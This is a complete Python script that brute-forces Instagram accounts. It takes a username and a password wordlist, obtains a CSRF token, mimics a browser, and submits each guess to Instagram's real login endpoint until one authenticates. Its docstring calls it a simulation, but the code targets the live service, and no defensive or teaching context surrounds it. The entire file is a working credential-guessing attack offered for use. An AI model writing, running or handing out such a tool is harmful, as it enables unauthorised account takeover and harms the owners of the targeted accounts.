import requests

def get_csrf_token(session):
    """
    Fetches the CSRF token from Instagram's login page.
    """
    login_url = "https://www.instagram.com/accounts/login/"
    response = session.get(login_url)
    csrf_token = response.cookies.get("csrftoken")
    return csrf_token

def brute_force_instagram(username, password_list):
    """
    Simulates a brute force attack on Instagram's login page.
    :param username: The username to test
    :param password_list: A list of passwords to try
    """
    # Instagram login URL
    login_url = "https://www.instagram.com/accounts/login/ajax/"

    # Create a session to handle cookies
    session = requests.Session()

    # Set headers to mimic a browser request
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
    }

    # Fetch the CSRF token
    csrf_token = get_csrf_token(session)
    headers["X-CSRFToken"] = csrf_token

    for password in password_list:
        # Prepare the login data
        login_data = {
            "username": username,
            "password": password,
            "queryParams": "{}",
            "optIntoOneTap": "false",
        }

        try:
            # Send the login request
            response = session.post(login_url, data=login_data, headers=headers)

            # Check if the login was successful
            if response.status_code == 200 and response.json().get("authenticated"):
                print(f"Success! Password found: {password}")
                return password
            else:
                print(f"Tried password: {password} - Failed")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            break

    print("Brute force attack completed. No valid password found.")
    return None

def main():
    # Input details
    username = input("Enter the username to test: ")
    password_file = input("Enter the path to the password list file (e.g., passwords.txt): ")

    # Load passwords from the file
    try:
        with open(password_file, "r") as file:
            password_list = [line.strip() for line in file]
    except FileNotFoundError:
        print("Password file not found. Please check the path.")
        return

    # Start the brute force attack
    print("Starting brute force attack...")
    found_password = brute_force_instagram(username, password_list)

    if found_password:
        print(f"Password found: {found_password}")
    else:
        print("No valid password found.")

if __name__ == "__main__":
    main()